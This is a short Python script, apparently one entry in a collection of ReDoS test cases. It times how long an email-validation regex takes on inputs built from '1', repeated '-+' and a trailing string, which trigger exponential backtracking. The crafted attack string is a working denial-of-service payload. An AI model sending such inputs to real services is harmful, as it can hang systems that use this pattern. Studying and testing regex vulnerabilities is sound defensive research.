# 3698
# ^\w+(([-+']|[-+.]|\w+))*@\w+([-.]\w+)*\.\w+([-.]\w+)*$
# EXPONENT
# nums:4
# EXPONENT AttackString:"1"+"-+"*16+"! _1_EOD(i4)"

import re
from time import perf_counter

regex = """^\w+(([-+']|[-+.]|\w+))*@\w+([-.]\w+)*\.\w+([-.]\w+)*$"""
REGEX = re.compile(regex)
for i in range(0, 150000):
    ATTACK = "1" + "-+" * i * 1 + "! _1_EOD(i4)"
    LEN = len(ATTACK)
    BEGIN = perf_counter()
    m = REGEX.search(ATTACK)
    # m = REGEX.match(ATTACK)
    DURATION = perf_counter() - BEGIN
    print(f"{i *1}: took {DURATION} seconds!")